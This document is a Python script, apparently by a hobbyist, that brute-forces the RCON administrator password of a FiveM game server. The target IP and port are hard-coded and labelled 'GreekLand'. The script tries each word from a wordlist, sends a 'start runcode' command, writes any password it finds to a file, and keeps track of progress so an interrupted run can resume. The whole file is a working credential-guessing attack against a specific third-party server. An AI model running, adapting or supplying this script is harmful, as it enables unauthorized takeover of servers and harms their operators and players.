from pyrcon import RCON

# it is adviced that you use ANSI encoding on your wordlist text file
wordlist = 'C:/Users/stamatis/Downloads/torrents/nicewordlist.txt'

# GreekLand
ip = '134.255.233.201'
port = 30120

# Do not edit from now on
print('--- FiveM RCON Password Bruteforce by phxgg\n')
print('[INFO] Starting Script\n')

done = False

# Log found rcon password into file
def log(word):
    f = open('found.txt', 'a+')

    f.write('---------------------------------------\n')
    f.write('Found RCON Password for %s:%d\n' % (ip, port))
    f.write('PASSWORD: %s' % (word))
    f.write('---------------------------------------\n\n')

    f.close()

# Try password function
def tryPassword(word):
    global done

    print('--- Attempting %s' % (word))

    rcon = RCON(ip, word, port=port)
    response = rcon.send_command('start runcode')

    # Do not check empty passwords
    if not word:
        return

    # Connection error. I had to edit the pyrcon library to catch this
    if response == 'conerr':
        print('[Error] Connection error on %s:%d. Retrying...' % (ip, port))
        # close rcon and retry password
        rcon.stop()
        tryPassword(word)
    else:
        if not(response == None):
            response = response.decode('ISO-8859-1') # readable byte decoding expert code xDDD

            if 'set rcon_password' in response:
                print('[Error] This server has not set an RCON Password.')
                done = True
                return
            
            if not('Invalid' in response or 'set rcon_password' in response or 'getstatus xxx' in response or 'start runcode' in response):
                print('[SUCCESS] Rcon Password for %s:%d is: %s' % (ip, port, word))
                log(word)
                done = True
                return
            
            rcon.stop()
        else:
            print('[Warning] Found NoneType byte on %s (response timeout). Retrying...' % (word))
            # close rcon and retry password
            rcon.stop()
            tryPassword(word)

# keep opened the last_pass text file to keep track of the latest pass used (so we dont have to go through all the already tried passwords in case of a crash)
with open('test_last_pass.txt', 'a+', encoding = 'latin-1') as fLastPass:
    # read wordlist
    with open(wordlist, encoding = "latin-1") as fWordlist:
        for word in fWordlist:
            word = word.rstrip("\n\r") # remove \n\r from passwords

            if done:
                fLastPass.close()
                fWordlist.close()
                break

            tryPassword(word)

            # Log last pass tried
            fLastPass.seek(0) # set position to start
            fLastPass.truncate() # truncate
            fLastPass.write(word) # write new password
